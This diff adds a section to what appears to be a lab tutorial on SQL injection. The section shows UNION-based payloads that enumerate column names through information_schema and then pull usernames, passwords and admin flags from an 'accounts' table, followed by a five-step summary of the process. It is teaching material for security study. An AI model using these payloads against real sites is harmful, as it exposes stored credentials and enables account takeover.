@@ -763,4 +763,94 @@ These tables can later be targeted to extract sensitive information such as:
 * credit card data
 * application information
 
+{{  Discovering Column Names with SQL Injection }}
+
+Now that we discovered the `accounts` table, the next step is to find the column names inside that table.
+
+We need the column names because SQL queries work like this:
+
+```sql id="jlwm1k"
+SELECT column_name FROM table_name;
+```
+
+At this stage, we already know the table name (`accounts`), but we still do not know its columns.
+
+To discover them, we query MySQL’s metadata database again using `information_schema.columns`.
+
+The injection becomes:
+
+```sql id="jlwm2l"
+adil' UNION SELECT null,column_name,null,null,null 
+FROM information_schema.columns 
+WHERE table_name='accounts'
+```
+
+Here:
+
+* `column_name` retrieves the names of columns
+* `information_schema.columns` stores information about all columns
+* `WHERE table_name='accounts'` filters results to only the `accounts` table
+
+When executed, the page returns column names such as:
+
+* `id`
+* `username`
+* `password`
+* `mysignature`
+* `isadmin`
+
+<img width="1440" height="871" alt="Screenshot 2026-05-12 at 9 28 01 AM" src="https://github.com/user-attachments/assets/03cc9c83-7eae-4bd9-8e46-0a2d4cbbfb15" />
+
+
+---
+
+ Extracting Sensitive Data
+
+Now that we know the column names, we can directly retrieve data from the `accounts` table itself.
+
+The next payload is:
+
+```sql id="jlwm3m"
+' UNION SELECT NULL,username,password,isadmin,NULL 
+FROM accounts
+```
+
+This query retrieves:
+
+* usernames
+* passwords
+* admin status
+
+The values are placed in columns `2`, `3`, and `4` because earlier testing showed those columns are visible on the webpage.
+
+When executed, the page displays all usernames and passwords stored in the database, including administrator accounts.
+
+Example results:
+
+* `admin : adminpass`
+* other usernames and passwords
+* whether the account has admin privileges
+
+<img width="1438" height="864" alt="Screenshot 2026-05-12 at 9 30 07 AM" src="https://github.com/user-attachments/assets/636379df-52af-48ba-9bd9-6e7ec0b2202c" />
+
+
+---
+
+ Why This Is Dangerous
+
+An attacker can now use these valid credentials to log in directly to the website as normal users or administrators.
+
+This demonstrates how severe SQL Injection vulnerabilities can become when sensitive data is exposed.
+
+---
+
+ SQL Injection Process Summary
+
+The general process followed during SQL Injection testing is:
+
+1. Find the number of columns
+2. Identify visible columns
+3. Enumerate database tables
+4. Enumerate column names
+5. Extract sensitive data directly from the database
 
